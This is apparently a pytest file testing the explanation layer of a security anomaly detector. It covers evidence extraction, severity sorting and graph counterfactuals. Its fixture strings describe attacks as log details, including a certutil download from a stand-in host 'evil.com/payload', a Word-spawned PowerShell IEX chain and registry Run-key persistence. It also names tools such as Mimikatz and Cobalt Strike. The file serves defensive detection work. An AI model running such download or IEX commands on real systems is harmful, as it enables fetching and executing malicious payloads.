"""Tests for the explainability layer (nabla/explain.py).

Covers:
- Evidence extraction from anomaly dicts (all detection methods)
- Evidence formatting (grouped by method, sorted by severity)
- Rule counterfactuals (type removal, severity drop, finding disappearance)
- Counterfactual formatting
- Graph counterfactuals (edge removal, community dissolution)
- Full explain_findings integration
"""

import pytest

from nabla.explain import (
    _extract_evidence_from_anomaly,
    compute_counterfactuals,
    compute_graph_counterfactuals,
    explain_findings,
    format_counterfactuals,
    format_evidence,
    format_graph_counterfactuals,
)


# ---------------------------------------------------------------------------
# Evidence extraction — per detection method
# ---------------------------------------------------------------------------


class TestExtractEvidenceZScore:
    def test_basic(self):
        a = {
            "detection_method": "z_score",
            "z_score": 3.5,
            "severity": "high",
            "details": "User admin has 150 events (z=3.5, mean=50.0, std=28.6, threshold=2.0)",
        }
        e = _extract_evidence_from_anomaly(a)
        assert e["rule"] == "z_score"
        assert e["actual"] == "z=3.5"
        assert e["threshold"] == "z>2.0"
        assert "+1.5" in e["margin"]

    def test_no_z_score_field(self):
        a = {
            "detection_method": "z_score",
            "severity": "medium",
            "details": "User test has 50 events",
        }
        e = _extract_evidence_from_anomaly(a)
        assert e["rule"] == "z_score"
        # Should not crash, just have empty fields


class TestExtractEvidenceBruteForce:
    def test_basic(self):
        a = {
            "detection_method": "failed_login_ratio",
            "severity": "high",
            "details": "User admin has 8 failures out of 10 auth events (80%, threshold=0.5)",
        }
        e = _extract_evidence_from_anomaly(a)
        assert e["rule"] == "failed_login_ratio"
        assert "80%" in e["actual"]
        assert ">50%" in e["threshold"]

    def test_with_brute_force_method(self):
        a = {
            "detection_method": "brute_force",
            "severity": "high",
            "details": "User admin has 5 failures out of 6 auth events (83%, threshold=0.5)",
        }
        e = _extract_evidence_from_anomaly(a)
        assert e["rule"] == "brute_force"
        assert "83%" in e["actual"]


class TestExtractEvidenceOffHours:
    def test_basic(self):
        a = {
            "detection_method": "off_hours",
            "severity": "medium",
            "details": "User admin has 5 events during off-hours (22:00-06:00 UTC, threshold=3)",
        }
        e = _extract_evidence_from_anomaly(a)
        assert e["rule"] == "off_hours"
        assert e["actual"] == "5 events"
        assert e["threshold"] == "≥3"
        assert e["margin"] == "+2"


class TestExtractEvidenceMultiIP:
    def test_basic(self):
        a = {
            "detection_method": "multi_ip",
            "severity": "high",
            "details": "User admin appeared from 5 unique IPs: 1.1.1.1, 2.2.2.2, 3.3.3.3, 4.4.4.4, 5.5.5.5 (threshold=3)",
        }
        e = _extract_evidence_from_anomaly(a)
        assert e["rule"] == "multi_ip"
        assert e["actual"] == "5 IPs"
        assert e["threshold"] == "≥3"
        assert e["margin"] == "+2"


class TestExtractEvidenceActivitySpike:
    def test_basic(self):
        a = {
            "detection_method": "activity_spike",
            "severity": "high",
            "details": "User admin has 150 events vs mean 50.0 (threshold=3.0x)",
        }
        e = _extract_evidence_from_anomaly(a)
        assert e["rule"] == "activity_spike"
        assert e["actual"] == "3.0x mean"
        assert e["threshold"] == ">3.0x"


class TestExtractEvidenceLOLBIN:
    def test_basic(self):
        a = {
            "detection_method": "lolbin",
            "severity": "high",
            "details": "LOLBIN certutil.exe with suspicious command: -urlcache -f http://evil.com/payload",
        }
        e = _extract_evidence_from_anomaly(a)
        assert e["rule"] == "lolbin"
        assert "certutil" in e["actual"]


class TestExtractEvidenceParentChild:
    def test_basic(self):
        a = {
            "detection_method": "parent_child",
            "severity": "high",
            "details": "Suspicious parent-child: winword.exe -> powershell.exe cmd=IEX",
        }
        e = _extract_evidence_from_anomaly(a)
        assert e["rule"] == "parent_child"
        assert "winword" in e["actual"]


class TestExtractEvidenceAttackScript:
    def test_with_display_name(self):
        a = {
            "detection_method": "attack_script",
            "severity": "critical",
            "tool_display_name": "Cobalt Strike beacon",
            "tool_name": "beacon",
            "details": "Known attack script: Cobalt Strike beacon (beacon)",
        }
        e = _extract_evidence_from_anomaly(a)
        assert e["rule"] == "attack_script"
        assert e["actual"] == "Cobalt Strike beacon"

    def test_without_display_name(self):
        a = {
            "detection_method": "attack_script",
            "severity": "critical",
            "tool_name": "mimikatz",
            "details": "Known attack script: Mimikatz (mimikatz)",
        }
        e = _extract_evidence_from_anomaly(a)
        assert e["rule"] == "attack_script"
        assert "mimikatz" in e["actual"]


class TestExtractEvidenceRenamedTool:
    def test_basic(self):
        a = {
            "detection_method": "renamed_tool",
            "severity": "critical",
            "tool_name": "Rubeus",
            "details": "Renamed attack tool: Kerberos TGS request (Rubeus) (process: rsynctool)",
        }
        e = _extract_evidence_from_anomaly(a)
        assert e["rule"] == "renamed_tool"
        assert "Rubeus" in e["actual"]
        assert "rsynctool" in e["actual"]


class TestExtractEvidenceGCNLOF:
    def test_basic(self):
        a = {
            "detection_method": "gcn_lof",
            "severity": "high",
            "gcn_lof_score": 0.85,
            "lof_score": 2.5,
            "reconstruction_error": 0.0012,
            "details": "GCN-LOF anomaly (score=0.850, lof=2.50, recon_err=0.0012)",
        }
        e = _extract_evidence_from_anomaly(a)
        assert e["rule"] == "gcn_lof"
        assert "0.850" in e["actual"]
        assert "0.850" in e["summary"]


class TestExtractEvidenceProvenanceCommunity:
    def test_basic(self):
        a = {
            "detection_method": "provenance_community",
            "severity": "high",
            "community_id": 3,
            "anomaly_density": 0.45,
            "details": "Community 3: 8 nodes, anomaly_density=0.45, types=['process', 'file']",
        }
        e = _extract_evidence_from_anomaly(a)
        assert e["rule"] == "provenance_community"
        assert "0.45" in e["actual"]
        assert e["threshold"] == ">0.30"


class TestExtractEvidenceTemporalChain:
    def test_basic(self):
        a = {
            "detection_method": "temporal_chain",
            "severity": "high",
            "chain_id": 1,
            "phase_coverage": 0.5,
            "phases": ["reconnaissance", "initial_access", "execution"],
            "details": "Temporal chain 1: 3 phases, coverage=0.500",
        }
        e = _extract_evidence_from_anomaly(a)
        assert e["rule"] == "temporal_chain"
        assert "0.5" in e["actual"] or "50" in e["actual"]
        assert "reconnaissance" in e["summary"]


class TestExtractEvidenceEWMA:
    def test_basic(self):
        a = {
            "detection_method": "ewma",
            "severity": "high",
            "details": "EWMA drift: 15 events in 5min bin (ewma=5.2, threshold=9.4)",
        }
        e = _extract_evidence_from_anomaly(a)
        assert e["rule"] == "ewma"
        assert "5.2" in e["actual"]


class TestExtractEvidenceCUSUM:
    def test_basic(self):
        a = {
            "detection_method": "cusum",
            "severity": "high",
            "details": "CUSUM sustained shift: S+=5.2 (h=4.0), mean=3.0/bin, current=8",
        }
        e = _extract_evidence_from_anomaly(a)
        assert e["rule"] == "cusum"
        assert "5.2" in e["actual"]
        assert "4.0" in e["threshold"]


class TestExtractEvidencePreFlagged:
    def test_basic(self):
        a = {
            "detection_method": "pre_flagged",
            "severity": "medium",
            "details": "Suspicious login from unusual location",
        }
        e = _extract_evidence_from_anomaly(a)
        assert e["rule"] == "pre_flagged"
        assert "Suspicious" in e["actual"]


class TestExtractEvidenceGeneric:
    def test_unknown_method(self):
        a = {
            "detection_method": "custom_detector",
            "severity": "medium",
            "details": "Custom anomaly detected: unusual pattern",
        }
        e = _extract_evidence_from_anomaly(a)
        assert e["rule"] == "custom_detector"
        assert e["actual"] != ""

    def test_missing_method(self):
        a = {
            "type": "unknown_type",
            "severity": "low",
            "details": "Something happened",
        }
        e = _extract_evidence_from_anomaly(a)
        assert e["rule"] == "unknown_type"


class TestExtractEvidenceOtherMethods:
    def test_action_sequence(self):
        a = {
            "detection_method": "action_sequence",
            "severity": "high",
            "details": "Create->execute->delete on DC01 by admin within 15min (window=30min)",
        }
        e = _extract_evidence_from_anomaly(a)
        assert e["rule"] == "action_sequence"
        assert "15min" in e["actual"]

    def test_suspicious_path(self):
        a = {
            "detection_method": "suspicious_path",
            "severity": "high",
            "details": "Process from suspicious path: C:\\Intel\\Build\\LB3.exe (patterns: temp_dir, shallow_path)",
        }
        e = _extract_evidence_from_anomaly(a)
        assert e["rule"] == "suspicious_path"
        assert "temp_dir" in e["actual"]

    def test_integrity_anomaly(self):
        a = {
            "detection_method": "integrity_anomaly",
            "severity": "high",
            "details": "High-integrity process from non-system parent: integrity=system, parent=winword",
        }
        e = _extract_evidence_from_anomaly(a)
        assert e["rule"] == "integrity_anomaly"
        assert "winword" in e["actual"]

    def test_critical_host_escalation(self):
        a = {
            "detection_method": "critical_host_escalation",
            "severity": "critical",
            "details": "Escalation command on critical host DC01: whoami /all",
        }
        e = _extract_evidence_from_anomaly(a)
        assert e["rule"] == "critical_host_escalation"
        assert "DC01" in e["summary"]

    def test_unusual_process(self):
        a = {
            "detection_method": "unusual_process",
            "severity": "medium",
            "details": "Process mimikatz first seen on host DC01 (not in baseline)",
        }
        e = _extract_evidence_from_anomaly(a)
        assert e["rule"] == "unusual_process"
        assert "mimikatz" in e["actual"]

    def test_registry_abuse(self):
        a = {
            "detection_method": "registry_abuse",
            "severity": "high",
            "details": "Registry modification by C:\\Intel\\Build\\LB3.exe: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        }
        e = _extract_evidence_from_anomaly(a)
        assert e["rule"] == "registry_abuse"
        assert "LB3" in e["actual"]

    def test_network_anomaly(self):
        a = {
            "detection_method": "network_anomaly",
            "severity": "high",
            "details": "Network connection from certutil.exe to 10.0.1.4:8443",
        }
        e = _extract_evidence_from_anomaly(a)
        assert e["rule"] == "network_anomaly"
        assert "certutil" in e["actual"]
        assert "10.0.1.4" in e["actual"]

    def test_enumeration_behavior(self):
        a = {
            "detection_method": "enumeration_behavior",
            "severity": "high",
            "details": "Enumeration behavior: admin used 5 enumeration commands (net user, whoami /all, ...)",
        }
        e = _extract_evidence_from_anomaly(a)
        assert e["rule"] == "enumeration_behavior"
        assert "enumeration" in e["summary"]


# ---------------------------------------------------------------------------
# Evidence formatting
# ---------------------------------------------------------------------------


class TestFormatEvidence:
    def test_empty(self):
        assert format_evidence([]) == ""

    def test_single_anomaly(self):
        anomalies = [{
            "detection_method": "off_hours",
            "severity": "medium",
            "details": "User admin has 5 events during off-hours (22:00-06:00 UTC, threshold=3)",
        }]
        result = format_evidence(anomalies)
        assert "off_hours" in result
        assert "threshold=≥3" in result

    def test_multiple_methods_sorted_by_severity(self):
        anomalies = [
            {
                "detection_method": "off_hours",
                "severity": "medium",
                "details": "User admin has 5 events during off-hours (threshold=3)",
            },
            {
                "detection_method": "attack_script",
                "severity": "critical",
                "details": "Known attack script: Cobalt Strike beacon (beacon)",
                "tool_display_name": "Cobalt Strike beacon",
            },
        ]
        result = format_evidence(anomalies)
        # attack_script (critical) should come before off_hours (medium)
        attack_pos = result.find("attack_script")
        off_pos = result.find("off_hours")
        assert attack_pos < off_pos

    def test_max_entries(self):
        anomalies = [
            {"detection_method": f"method_{i}", "severity": "medium", "details": f"Anomaly {i}"}
            for i in range(10)
        ]
        result = format_evidence(anomalies, max_entries=3)
        # Should have at most 3 evidence entries
        assert result.count("    - ") <= 3

    def test_count_annotation(self):
        anomalies = [
            {"detection_method": "off_hours", "severity": "medium", "details": "User a has 5 events (threshold=3)"},
            {"detection_method": "off_hours", "severity": "medium", "details": "User b has 4 events (threshold=3)"},
        ]
        result = format_evidence(anomalies)
        assert "2 anomalies" in result


# ---------------------------------------------------------------------------
# Rule counterfactuals
# ---------------------------------------------------------------------------


class TestComputeCounterfactuals:
    def test_single_type_removal(self):
        """Finding with a single anomaly type disappears when that type is removed."""
        finding = {
            "entity": "admin",
            "entity_type": "user",
            "type": "attack_script",
            "severity": "critical",
        }
        correlations = [{
            "entity": "admin",
            "entity_type": "user",
            "anomaly_types": ["attack_script"],
            "anomalies": [{"type": "attack_script", "severity": "critical", "detection_method": "attack_script"}],
        }]
        cfs = compute_counterfactuals(finding, correlations, {})
        assert len(cfs) >= 1
        assert any("attack_script" in cf["change"] for cf in cfs)

    def test_multi_type_removal(self):
        """Removing one type from a multi-type finding may drop severity."""
        finding = {
            "entity": "admin",
            "entity_type": "user",
            "type": "attack_script, off_hours_activity",
            "severity": "critical",
        }
        correlations = [{
            "entity": "admin",
            "entity_type": "user",
            "anomaly_types": ["attack_script", "off_hours_activity"],
            "anomalies": [
                {"type": "attack_script", "severity": "critical", "detection_method": "attack_script"},
                {"type": "off_hours_activity", "severity": "medium", "detection_method": "off_hours"},
            ],
        }]
        cfs = compute_counterfactuals(finding, correlations, {})
        assert len(cfs) >= 1
        # Should have counterfactuals for both types
        changes = [cf["change"] for cf in cfs]
        assert any("attack_script" in c for c in changes)

    def test_no_matching_correlation(self):
        """Finding with no matching correlation produces no counterfactuals."""
        finding = {
            "entity": "unknown_user",
            "entity_type": "user",
            "type": "attack_script",
            "severity": "critical",
        }
        correlations = [{
            "entity": "different_user",
            "entity_type": "user",
            "anomaly_types": ["attack_script"],
            "anomalies": [],
        }]
        cfs = compute_counterfactuals(finding, correlations, {})
        assert len(cfs) == 0


class TestFormatCounterfactuals:
    def test_empty(self):
        assert format_counterfactuals([]) == ""

    def test_basic(self):
        cfs = [
            {"change": "if attack_script were a false positive", "effect": "severity drops from CRITICAL to HIGH"},
            {"change": "if off_hours were a false positive", "effect": "finding persists (severity unchanged at CRITICAL, 2 types remain)"},
        ]
        result = format_counterfactuals(cfs)
        assert "attack_script" in result
        assert "severity drops" in result
        assert "finding persists" in result


# ---------------------------------------------------------------------------
# Graph counterfactuals
# ---------------------------------------------------------------------------


class TestComputeGraphCounterfactuals:
    def test_small_community(self):
        """Community with < 3 members produces no counterfactuals."""
        community = {"members": [("process", "a"), ("process", "b")], "anomaly_density": 0.5}
        # Need a mock graph — just pass None and expect graceful failure
        # Actually, the function needs a real graph. Let's test with a minimal one.
        # For now, just test the size guard.
        from nabla.provenance import ProvenanceGraph
        graph = ProvenanceGraph()
        result = compute_graph_counterfactuals(graph, community, set())
        assert result == []

    def test_empty_community(self):
        """Empty community produces no counterfactuals."""
        community = {"members": [], "anomaly_density": 0.0}
        from nabla.provenance import ProvenanceGraph
        graph = ProvenanceGraph()
        result = compute_graph_counterfactuals(graph, community, set())
        assert result == []


class TestFormatGraphCounterfactuals:
    def test_empty(self):
        assert format_graph_counterfactuals([]) == ""

    def test_basic(self):
        cfs = [{
            "edge": (("process", "powershell"), ("file", "payload.exe"), "wrote"),
            "effect": "community splits",
            "new_density": 0.0,
        }]
        result = format_graph_counterfactuals(cfs)
        assert "powershell" in result
        assert "payload.exe" in result
        assert "community splits" in result


# ---------------------------------------------------------------------------
# Full explain_findings integration
# ---------------------------------------------------------------------------


class TestExplainFindings:
    def test_empty_findings(self):
        result = explain_findings([], [], [], {})
        assert result == ""

    def test_with_findings(self):
        findings = [{
            "entity": "admin",
            "entity_type": "user",
            "type": "attack_script",
            "severity": "critical",
        }]
        anomalies = [{
            "detection_method": "attack_script",
            "severity": "critical",
            "user": "admin",
            "tool_display_name": "Cobalt Strike beacon",
            "details": "Known attack script: Cobalt Strike beacon (beacon)",
        }]
        correlations = [{
            "entity": "admin",
            "entity_type": "user",
            "anomaly_types": ["attack_script"],
            "anomalies": [anomalies[0]],
        }]
        result = explain_findings(findings, anomalies, correlations, {})
        assert "EVIDENCE" in result
        assert "attack_script" in result

    def test_truncation(self):
        """Very long explanation gets truncated to 2000 chars."""
        findings = [{
            "entity": f"user_{i}",
            "entity_type": "user",
            "type": "attack_script",
            "severity": "critical",
        } for i in range(50)]
        anomalies = [{
            "detection_method": "attack_script",
            "severity": "critical",
            "user": f"user_{i}",
            "details": f"Known attack script: Tool {i} " * 20,
        } for i in range(50)]
        correlations = [{
            "entity": f"user_{i}",
            "entity_type": "user",
            "anomaly_types": ["attack_script"],
            "anomalies": [anomalies[i]],
        } for i in range(50)]
        result = explain_findings(findings, anomalies, correlations, {})
        assert len(result) <= 2003  # 2000 + "..."


class TestExplainFindingsWithGraph:
    def test_with_provenance_data(self):
        """When graph + communities + anomaly_nodes are provided, graph counterfactuals
        are attempted (even if they produce no results for small communities)."""
        findings = [{
            "entity": "admin",
            "entity_type": "user",
            "type": "provenance_community",
            "severity": "high",
            "graph_community": {"community_id": 1},
        }]
        anomalies = [{
            "detection_method": "provenance_community",
            "severity": "high",
            "community_id": 1,
            "anomaly_density": 0.45,
            "details": "Community 1: 8 nodes, anomaly_density=0.45",
        }]
        correlations = [{
            "entity": "admin",
            "entity_type": "user",
            "anomaly_types": ["provenance_community"],
            "anomalies": [anomalies[0]],
        }]
        from nabla.provenance import ProvenanceGraph
        graph = ProvenanceGraph()
        communities = [{"id": 1, "members": [("process", "a"), ("process", "b")], "anomaly_density": 0.45}]
        anomaly_nodes = {("process", "a")}
        result = explain_findings(
            findings, anomalies, correlations, {},
            graph=graph, communities=communities, anomaly_nodes=anomaly_nodes,
        )
        # Should at least have EVIDENCE section, even if no graph counterfactuals
        assert "EVIDENCE" in result


class TestComputeGraphCounterfactualsWithGraph:
    """Graph counterfactuals with real ProvenanceGraph and Louvain."""

    def test_bridge_edge_in_counterfactuals(self):
        """Removing a bridge edge between two clusters should produce a counterfactual.

        Build a chain of 9 nodes in 3 clusters connected by bridges.
        The community includes all 9 nodes. Removing a bridge should cause
        Louvain to split the community, producing a counterfactual.
        """
        from nabla.provenance import ProvenanceGraph

        graph = ProvenanceGraph()
        # Cluster 1: A-B-C
        a = graph.add_node("process", "procA")
        b = graph.add_node("process", "procB")
        c = graph.add_node("process", "procC")
        graph.add_edge(a, b, "parent_of")
        graph.add_edge(b, c, "executed_on")

        # Cluster 2: D-E-F
        d = graph.add_node("process", "procD")
        e = graph.add_node("process", "procE")
        f = graph.add_node("process", "procF")
        graph.add_edge(d, e, "parent_of")
        graph.add_edge(e, f, "executed_on")

        # Cluster 3: G-H-I
        g = graph.add_node("process", "procG")
        h = graph.add_node("process", "procH")
        i = graph.add_node("process", "procI")
        graph.add_edge(g, h, "parent_of")
        graph.add_edge(h, i, "executed_on")

        # Bridges: C-D, F-G
        graph.add_edge(c, d, "connected_to")
        graph.add_edge(f, g, "connected_to")

        # Mark some nodes as anomalous
        graph.node_anomaly = {a, c, e, f, h, i}

        community = {
            "id": 1,
            "members": [a, b, c, d, e, f, g, h, i],
            "anomaly_density": 0.67,
        }

        cfs = compute_graph_counterfactuals(graph, community, graph.node_anomaly)
        # At least one edge should be identified as critical
        # (either "community splits" or "density drops")
        assert len(cfs) > 0
        # All counterfactuals should be "community splits" (since removing any
        # single edge from a 3-cluster chain splits the community)
        assert all(cf["effect"] == "community splits" for cf in cfs)

    def test_line_graph_edge_removal(self):
        """In a 3-node line A-B-C, removing either edge isolates a node.

        The community has 3 members. Removing A-B or B-C should produce
        a counterfactual (community splits or density drops).
        """
        from nabla.provenance import ProvenanceGraph

        graph = ProvenanceGraph()
        a = graph.add_node("process", "procA")
        b = graph.add_node("process", "procB")
        c = graph.add_node("process", "procC")
        graph.add_edge(a, b, "parent_of")
        graph.add_edge(b, c, "executed_on")

        graph.node_anomaly = {a, c}

        community = {
            "id": 1,
            "members": [a, b, c],
            "anomaly_density": 0.67,
        }

        cfs = compute_graph_counterfactuals(graph, community, graph.node_anomaly)
        # At least one edge should be identified as critical
        assert len(cfs) > 0

    def test_fully_connected_no_split(self):
        """A fully connected 3-node community (triangle) should not split from single edge removal.

        Removing one edge from a triangle leaves a connected pair + one node
        still connected to one of them. Louvain may or may not produce
        counterfactuals, but the function should not crash.
        """
        from nabla.provenance import ProvenanceGraph

        graph = ProvenanceGraph()
        a = graph.add_node("process", "procA")
        b = graph.add_node("process", "procB")
        c = graph.add_node("process", "procC")
        graph.add_edge(a, b, "parent_of")
        graph.add_edge(b, c, "executed_on")
        graph.add_edge(a, c, "connected_to")

        graph.node_anomaly = {a}

        community = {
            "id": 1,
            "members": [a, b, c],
            "anomaly_density": 0.33,
        }

        # Should not crash
        cfs = compute_graph_counterfactuals(graph, community, graph.node_anomaly)
        assert isinstance(cfs, list)

    def test_explain_findings_includes_graph_counterfactuals(self):
        """explain_findings with graph data should include Graph Counterfactuals section
        when a finding has a matching community with bridge edges."""
        from nabla.provenance import ProvenanceGraph

        graph = ProvenanceGraph()
        a = graph.add_node("process", "procA")
        b = graph.add_node("process", "procB")
        c = graph.add_node("process", "procC")
        d = graph.add_node("process", "procD")
        e = graph.add_node("process", "procE")
        graph.add_edge(a, b, "parent_of")
        graph.add_edge(b, c, "executed_on")
        graph.add_edge(c, d, "connected_to")  # bridge
        graph.add_edge(d, e, "parent_of")

        graph.node_anomaly = {a, c, e}

        communities = [{
            "id": 1,
            "members": [a, b, c, d, e],
            "anomaly_density": 0.6,
        }]

        findings = [{
            "entity": "procA",
            "entity_type": "process",
            "type": "provenance_community",
            "severity": "high",
            "graph_community": {"community_id": 1},
        }]
        anomalies = [{
            "detection_method": "provenance_community",
            "severity": "high",
            "user": "procA",
        }]
        correlations = [{
            "entity": "procA",
            "entity_type": "process",
            "anomaly_types": ["provenance_community"],
            "anomalies": [anomalies[0]],
        }]

        result = explain_findings(
            findings, anomalies, correlations, {},
            graph=graph, communities=communities, anomaly_nodes=graph.node_anomaly,
        )
        assert "EVIDENCE" in result
